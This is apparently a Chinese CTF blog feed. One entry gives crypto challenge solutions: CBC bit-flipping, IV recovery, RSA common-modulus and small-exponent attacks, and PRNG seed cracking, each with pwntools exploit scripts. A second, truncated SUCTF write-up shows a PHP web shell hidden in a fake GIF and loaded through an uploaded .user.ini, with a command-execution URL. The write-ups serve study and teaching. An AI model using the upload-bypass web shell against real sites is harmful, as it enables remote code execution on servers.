        <content type="html"><![CDATA[<h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><pre><code>base64_table = [&#39;=&#39;,&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;+&#39;, &#39;/&#39;][::-1]def encode_b64(s):    l = len(s)    i = 0    result = &#39;&#39;    while i &lt; l:        # 将字符转换为二进制编码，然后对齐        s1 = s[i]        b1 = bin(ord(s1))[2:]        cb1 = b1.rjust(8, &#39;0&#39;)        i += 1        if i &gt;= l:            cb2 = &#39;00000000&#39;        else:            s2 = s[i]            b2 = bin(ord(s2))[2:]            cb2 = b2.rjust(8, &#39;0&#39;)        i += 1        if i &gt;= l:            cb3 = &#39;00000000&#39;        else:            s3 = s[i]            b3 = bin(ord(s3))[2:]            cb3 = b3.rjust(8, &#39;0&#39;)        # 将三字节转换为四字节        cb = cb1 + cb2 + cb3        rb1 = cb[:6]        rb2 = cb[6:12]        rb3 = cb[12:18]        rb4 = cb[18:]        # 转换后的编码转为十进制备用        ri1 = int(rb1, 2)        ri2 = int(rb2, 2)        ri3 = int(rb3, 2)        ri4 = int(rb4, 2)        # 处理末尾为０的情况，以＇＝＇填充        if i - 1 &gt;= l and ri3 == 0:            ri3 = -1        if i &gt;= l and ri4 == 0:            ri4 = -1        result += base64_table[ri1] + base64_table[ri2] + base64_table[ri3] + base64_table[ri4]        i += 1    return resultprint encode_b64(open(&quot;flag&quot;,&quot;r&quot;).read())#output: mZOemISXmpOTkKCHkp6Rgv==</code></pre><p>output是一个类base64编码，但是编码函数中的表的顺序换了，将顺序恢复就行了。</p><pre><code>from base64 import b64decodebase64_table = [&#39;=&#39;,&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;+&#39;, &#39;/&#39;][::-1]# print base64_tableold_base64_table = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;+&#39;, &#39;/&#39;,&#39;=&#39;]s=&quot;&quot;output= &#39;mZOemISXmpOTkKCHkp6Rgv==&#39;for i in output:    s+=old_base64_table[base64_table.index(i)]print s.decode(&quot;base64&quot;)</code></pre><h3 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h3><pre><code>def caesar_encrypt(m,k):    r=&quot;&quot;    for i in m:        r+=chr((ord(i)+k)%128)    return rfrom secret import m,kprint caesar_encrypt(m,k).encode(&quot;base64&quot;)#output:bXNobgJyaHB6aHRwdGgE</code></pre><p>凯撒密码，爆破一下，k为7时候得到flag</p><pre><code>def caesar_decrypt(m,k):    r=&quot;&quot;    for i in m:        r+=chr((ord(i)-k)%128)    return routput=&quot;bXNobgJyaHB6aHRwdGgE&quot;t=output.decode(&quot;base64&quot;)# for i in range(10):#     print caesar_decrypt(t,i)print caesar_decrypt(t,7)</code></pre><h2 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h2><p>分组密码(block cipher)的数学模型是将明文消息编码表示后的数字（简称明文数字）序列，划分成长度为n的组,每组分别在密钥的控制下变换成等长的密文。</p><p>cbc加密图解</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="C:%5CUsers%5Ccmdrgh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564747039050.png" alt="1564747039050"></h3><h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><pre><code>from Crypto.Cipher import AESm=&quot;hahahahahahahaha=1;admin=0;uid=1&quot;key=&quot;1234567890abcdef&quot;iv=&quot;fedcba0987654321&quot;cipher = AES.new(key, AES.MODE_CBC, iv)c=cipher.encrypt(m)print c.encode(&quot;hex&quot;)#49a98685a527bdfa4077c400963a4e3c9effb4148566f10bce9e07ccbb731896</code></pre><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="C:%5CUsers%5Ccmdrgh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564748060926.png" alt="1564748060926"></h3><p>第二组的第10个字符的明文异或过第一组的第10个字符的密文解密的时候会先AES decrypt，然后和第一组的密文异或，得到第二组的明文。通过通过修改第一组的密文就可以控制第二组的明文，把admin=0改成admin=1。</p><pre><code>Dec(C2)[i]=C1[i]^M2[i]• 目标：M2[i]-&gt;X• M2[i]= Dec(C2)[i]^C1[i]• X= Dec(C2)[i]^(C1[i]^X^M2[i])• 在第一个分组对应位置上异或上X和M2[i]即可chr(ord(m[position[i]])^ord(target[i])^ord(c[change]))</code></pre><p>例题xbitf</p><pre><code>import randomimport timeflag=open(&quot;/root/xbitf/flag&quot;,&quot;r&quot;).read()from Crypto.Cipher import AESimport osdef aes_cbc(key,iv,m):    handler=AES.new(key,AES.MODE_CBC,iv)    return handler.encrypt(m).encode(&quot;hex&quot;)def aes_cbc_dec(key,iv,c):    handler=AES.new(key,AES.MODE_CBC,iv)    return handler.decrypt(c.decode(&quot;hex&quot;))key=os.urandom(16)iv=os.urandom(16)session=os.urandom(8)token=&quot;session=&quot;+session.encode(&quot;hex&quot;)+&quot;;admin=0&quot;checksum=aes_cbc(key,iv,token)print token+&quot;;checksum=&quot;+checksumfor i in range(10):    token_rcv=raw_input(&quot;token:&quot;)    if token_rcv.split(&quot;admin=&quot;)[1][0]==&#39;1&#39; and token_rcv.split(&quot;session=&quot;)[1][0:16].decode(&quot;hex&quot;)==session:        c_rcv=token_rcv.split(&quot;checksum=&quot;)[1].strip()        m_rcv=aes_cbc_dec(key,iv,c_rcv)        print m_rcv        if m_rcv.split(&quot;admin=&quot;)[1][0]==&#39;1&#39;:            print flag</code></pre><pre><code>from pwn import *p = remote(&#39;47.97.215.88&#39;,10000)p.recvuntil(&quot;session=&quot;)session = p.recvuntil(&quot;;&quot;,drop=True)p.recvuntil(&quot;checksum=&quot;)checksum = p.recvuntil(&quot;\n&quot;,drop=True)c1de=c1.decode(&#39;hex&#39;)t=ord(c1de[15])^ord(&#39;1&#39;)^ord(&#39;0&#39;)cks = checksum[:30]+chr(t).encode(&#39;hex&#39;)+checksum[32:]token = &quot;session=&quot;+session+&quot;;admin=1;checksum=&quot;+cksp.recvuntil(&quot;token:&quot;)p.sendline(token)p.interactive()</code></pre><h3 id="CBC选择密文攻击"><a href="#CBC选择密文攻击" class="headerlink" title="CBC选择密文攻击"></a>CBC选择密文攻击</h3><p>通过CBC模式的选择密文攻击，可以很快地恢复出IV，明文每次加密前会和IV异或，IV每组会更新为上一组的密文<br>当待解密的密文为：C|C时<br>Decrypt(C)^C=M1 和 Decrypt(C)^IV=M0<br>综合上面两个信息的话， Decrypt(C)^C^Decrypt(C)^IV=M1^M0<br>所以 IV=M1^M0^C<br>也就是说如果我们能够通过一个oracle或者其他方式得到C|C这种模式的密文的话，就可以逆推出IV  </p><p>例题xcc</p><pre><code>import randomimport timeflag=open(&quot;/root/xcc/flag&quot;,&quot;r&quot;).read()from Crypto.Cipher import AESimport osdef aes_cbc(key,iv,m):    handler=AES.new(key,AES.MODE_CBC,iv)    return handler.encrypt(m).encode(&quot;hex&quot;)def aes_cbc_dec(key,iv,c):    handler=AES.new(key,AES.MODE_CBC,iv)    return handler.decrypt(c.decode(&quot;hex&quot;))key=os.urandom(16)iv=flagfor i in range(10):    c=raw_input(&quot;c:&quot;)    print aes_cbc_dec(key,iv,c).encode(&quot;hex&quot;)</code></pre><p>构造密文32个A，让两组密文相同。得到解密后的明文分成m0和m1，M1^M0^C异或时先转成int，最后得到IV</p><pre><code>from pwn import *from Crypto.Util.number import long_to_bytes,bytes_to_longp = remote(&quot;47.97.215.88&quot;,10001)p.recvuntil(&#39;c:&#39;)print (&quot;A&quot;*32)print ((&quot;A&quot;*32).encode(&#39;hex&#39;))p.sendline((&quot;A&quot;*32).encode(&#39;hex&#39;))c = p.recv(64)print cm0 = c[:32]m1 = c[32:]print &quot;btol&quot;print bytes_to_long(m0.decode(&#39;hex&#39;))print bytes_to_long(m1.decode(&#39;hex&#39;))print bytes_to_long(&quot;A&quot;*16)iv = bytes_to_long(m0.decode(&#39;hex&#39;))^bytes_to_long(m1.decode(&#39;hex&#39;))^bytes_to_long(&quot;A&quot;*16)print long_to_bytes(iv)p.interactive()</code></pre><h3 id="padding-oracle攻击"><a href="#padding-oracle攻击" class="headerlink" title="padding oracle攻击"></a>padding oracle攻击</h3><h2 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h2><p>格式转化：将字符串转化成数字</p><pre><code>#python2#数字转字符串num=584734024210391580014049650557280915516226103165print hex(num)[2:].decode(&quot;hex&quot;) #看长度是否为偶数print hex(num)[2:-1].decode(&quot;hex&quot;) #flag{this_is_a_flag}#字符串转数字s=&quot;flag{this_is_a_flag}&quot;print int(s.encode(&quot;hex&quot;),16) #584734024210391580014049650557280915516226103165#python3from libnum import n2s,s2nfrom Crypto.Util.number import long_to_bytes,bytes_to_long#数字转字符串print long_to_bytes(m)print n2s(m)#字符串转数字print bytes_to_long(x)print s2n(x)</code></pre><h3 id="直接模数分解"><a href="#直接模数分解" class="headerlink" title="直接模数分解"></a>直接模数分解</h3><p>rsa的数学难题：分解大数n<br>私钥额外的知识：知道p和q（phi(n))<br>当N的长度较小，可直接分解</p><p>题目已知N，e，c</p><pre><code>n=3161262255255421133292506694323988711204792818702640666084331634444148712428915950639954540974469931426618702044672318134908678730641981414037034058320359158246813987154679178159391832232990193738454116371045928434239936027006539348488316754611586659587677659791620481200732564068367148541242426533823626586574915275209508300120574819113851895932912208783915652764568319771482309338434364094681579135086703127977870534715039005822312878739611630155714313119545610939253355808742646891815442758660278514976431521933763272615653261044607041876212998883732724662410197038419721773290601109065965674129599626151139566369e=65537c=631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406</code></pre><p>用yafu直接分解N，得到p，q</p><pre><code>import gmpy2from Crypto.Util.number import long_to_bytes,bytes_to_longe=65537c=631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406p=56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848927q=56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848447N=p*qphin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print &quot;d&quot;,d#137443939677632407697822373106774146170757453506013404320961flag = gmpy2.powmod(c, d, N)print hex(flag)[2:].decode(&#39;hex&#39;)</code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>识别：两组及以上的RSA加密过程，而且其中两次的m和n都是相同的，但是e不同，那么就可以使用共模攻击</p><pre><code>c1 = m^e1 mod Nc2 = m^e2 mod Nr*e1 + s*e2 = 1 mod N #拓展欧几里得算法c1^r*c2^s = m^(r*e1)*m^(s*e2) mod N= m^(r*e1+s*e2) mod N = m mod N</code></pre><p>例题xgm：已知n1，e1，c1，n2，e2，c2。</p><pre><code>from Crypto.Util.number import long_to_bytes,bytes_to_long,getPrime,isPrimeimport primefacdef same_n_sttack(n,e1,e2,c1,c2):    def egcd(a, b):        x, lastX = 0, 1        y, lastY = 1, 0        while (b != 0):            q = a // b            a, b = b, a % b            x, lastX = lastX - q * x, x            y, lastY = lastY - q * y, y        return (lastX, lastY)    s = egcd(e1, e2)    s1 = s[0]    s2 = s[1]    if s1&lt;0:        s1 = - s1        c1 = primefac.modinv(c1, n)        if c1&lt;0:            c1+=n    elif s2&lt;0:        s2 = - s2        c2 = primefac.modinv(c2, n)        if c2&lt;0:            c2+=n    m=(pow(c1,s1,n)*pow(c2,s2,n)) % n    return mn1=21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061e1=65537c1=11623242520063564721509699039034210329314238234068836130756457335142671659158578379060500554276831657322012285562047706736377103534543565179660863796496071187533860896148153856845638989384429658963134915230898572173720454271369543435708994457280819363318783413033774014447450648051500214508699056865320506104733203716242071136228269326451412159760818676814129428252523248822316633339393821052614033884661649376604245744651142959498917235138077366818109892738298251161767344501687113868331134288984466294415889635863660753717476594011236542159800099371872396181448655448842148998667568104710807411358117939831241620315n2=21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061e2=70001c2=8180690717251057689732022736872836938270075717486355807317876695012318283159440935866297644561407238807004565510263413544530421072353735781284166685919420305808123063907272925594909852212249704923889776430284878600408776341129645414000647100303326242514023325498519509077311907161849407990649396330146146728447312754091670139159346316264091798623764434932753276554781692238428057951593104821823029665203821775755835076337570281155689527215367647821372680421305939449511621244288104229290161484649056505784641486376741409443450331991557221540050574024894427139331416236263783977068315294198184169154352536388685040531print long_to_bytes(same_n_sttack(n1,e1,e2,c1,c2))</code></pre><h3 id="小指数明文爆破"><a href="#小指数明文爆破" class="headerlink" title="小指数明文爆破"></a>小指数明文爆破</h3><p>观察加密：c=m^e mod n<br>如果e很小，比如e=3，那么如果明文也很小的情况下可能会出现这种情况： m^e &lt; n<br>此时直接对c开e次根号就可以得到m<br>另一种情况：<code>k*n &lt; m^3 &lt; (k+1)*n</code>，m^e虽然大于n了但是没有超出太多</p><p>例题xbk</p><pre><code>n=47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659e=3c=10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839</code></pre><p>m^3=c+i*n =&gt; m=(c+i*n)^(1/3) 爆破i</p><pre><code>import gmpy2n=47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659e=3c=10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839i=0while 1:    if(gmpy2.iroot(c+i*n, 3)[1]==1):        t= gmpy2.iroot(c+i*n, 3)[0]        print hex(t)[2:].decode(&quot;hex&quot;)        break    i=i+1</code></pre><h2 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h2><h3 id="babyrpd"><a href="#babyrpd" class="headerlink" title="babyrpd"></a>babyrpd</h3><pre><code>import randomimport timeflag=open(&quot;/root/level0/flag&quot;,&quot;r&quot;).read()random.seed(int(time.time()))def check():    recv=int(raw_input())    if recv==random.randint(0,2**64):        print flag        return True    else:        print &quot;atum tql&quot;        return Falsewhile 1:    if check():        break</code></pre><p>random.randint伪随机数，只要时间种子一样就可以得到flag。目标服务器的时间可能会和本地差几秒，爆破一下。注意在更新时间种子之后，要执行相同次数的random.randint函数，保证本地随机数的生成顺序和目标服务器的是一样的。</p><pre><code>import randomimport timefrom pwn import *p = remote(&quot;47.97.215.88&quot;,20000)def getstream(t1):    for i in range(t1-1):        random.randint(0, 2 ** 64)    return random.randint(0, 2 ** 64)t=int(time.time())t1=0for i in range(-5,5):    print i    t1=t1+1    random.seed(t)    p.sendline(str(getstream(t1)))p.interactive()</code></pre><h3 id="hardrpd"><a href="#hardrpd" class="headerlink" title="hardrpd"></a>hardrpd</h3><pre><code>from random import *while 1:    a=raw_input(&quot;#&quot;)    target=getrandbits(32)    if a!=str(target):        print target    else:        print open(&quot;flag&quot;,&quot;rb&quot;).read()</code></pre><p>getrandbits(k) 生成一个k比特长的随机整数</p><p>通过提供的Main.class Main.java爆破，需要java环境。再向服务器得到了624个随机数后可以预测下一个。</p><pre><code>from pwn import *import subprocessimport randomdef sign(iv):    # converts a 32 bit uint to a 32 bit signed int    if(iv&amp;0x80000000):        iv = -0x100000000 + iv    return ivdef crack_prng(outputs_624_list):    get_in=[]    for i in outputs_624_list:        get_in.append(sign(i))    o = subprocess.check_output([&quot;java&quot;, &quot;Main&quot;] + map(str, get_in))    stateList = [int(s) % (2 ** 32) for s in o.split()]    r = random.Random()    state = (3, tuple(stateList + [624]), None)    r.setstate(state)    return rp = remote(&quot;47.97.215.88&quot;,20002)l = []for i in range(624):    p.recvuntil(&quot;#&quot;)    p.sendline(&quot;1&quot;)    l.append(int(p.recvuntil(&quot;\n&quot;,drop=True)))r = crack_prng(l)p.recvuntil(&quot;#&quot;)p.sendline(str(r.getrandbits(32)))p.interactive()</code></pre><h3 id="mediumrpd"><a href="#mediumrpd" class="headerlink" title="mediumrpd"></a>mediumrpd</h3><pre><code>import subprocesso = subprocess.check_output([&quot;java&quot;, &quot;Main&quot;])tmp=[]for i in o.split(&quot;\n&quot;)[0:3]:    tmp.append(int(i.strip()))v1=tmp[0] % 0xffffffffv2=tmp[1] % 0xffffffffv3=tmp[2] % 0xffffffffprint v1print v2v3_get=int(raw_input())if v3_get==v3:    print flag</code></pre><pre><code>import java.util.Random;public class Main {    public static void main(String[] args) {        Random random = new Random();        System.out.println(random.nextInt());        System.out.println(random.nextInt());        System.out.println(random.nextInt());    }}</code></pre><p>python通过调用Main.java的random.nextInt()函数生成随机数。题目会先生成三个数，一开始会给我们两个数。我们通过爆破种子得到连续的两个数等于v1，v2可知这个种子是正确的，从而得到v3。exp多打几次</p><pre><code>import randomimport timefrom pwn import *def liner(seed):    return ((seed*25214903917+11)&amp;0xffffffffffff)p = remote(&quot;47.97.215.88&quot;,20001)v1 = int(p.recvuntil(&quot;\n&quot;,drop=True))v2 = int(p.recvuntil(&quot;\n&quot;,drop=True))for i in range(0xffff):        seed = v1*65536+i    if (liner(seed)&gt;&gt;16) == v2:        p.sendline(str(liner(liner(seed))&gt;&gt;16))info(&quot;failed:(&quot;)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>suctf writeup</title>
      <link href="/2019/08/20/writeup/suctf-writeup/"/>
      <url>/2019/08/20/writeup/suctf-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="checkin-文件上传-user-ini"><a href="#checkin-文件上传-user-ini" class="headerlink" title="checkin(文件上传 user.ini)"></a>checkin(文件上传 user.ini)</h2><p>上传一个文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// error_reporting(0);</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/index.php"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"filesize too big!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"filename cannot be empty!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph|htacess/i"</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal suffix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"exif_imagetype:not image!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Your dir "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span> <span class="token string">' &lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'Your files : &lt;br>'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>过滤了名称有ph , htacess。内容有&lt;? 。image_type判断文件头</p><p>###payload</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Disposition:</span> form-data; name="fileUpload"; filename="1.jpg"<span class="token header-name keyword">Content-Type:</span> image/jpegGIF89aaa&lt;script language="php">system($_GET['a']);&lt;/script>------WebKitFormBoundaryyCukuHbYjBwoPM6w<span class="token header-name keyword">Content-Disposition:</span> form-data; name="upload"</code></pre><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Disposition:</span> form-data; name="fileUpload"; filename=".user.ini"<span class="token header-name keyword">Content-Type:</span> application/octet-streamGIF89a="hh"auto_prepend_file="1.jpg"------WebKitFormBoundary73nXJwBvXid5MKgD<span class="token header-name keyword">Content-Disposition:</span> form-data; name="upload"</code></pre><pre class=" language-php"><code class="language-php">uploads<span class="token operator">/</span>e84b94ec7d0575be7f262842e902e7a0<span class="token operator">/</span><span class="token operator">?</span>a<span class="token operator">=</span>cat<span class="token operator">%</span>20index<span class="token punctuation">.</span>php</code></pre><h2 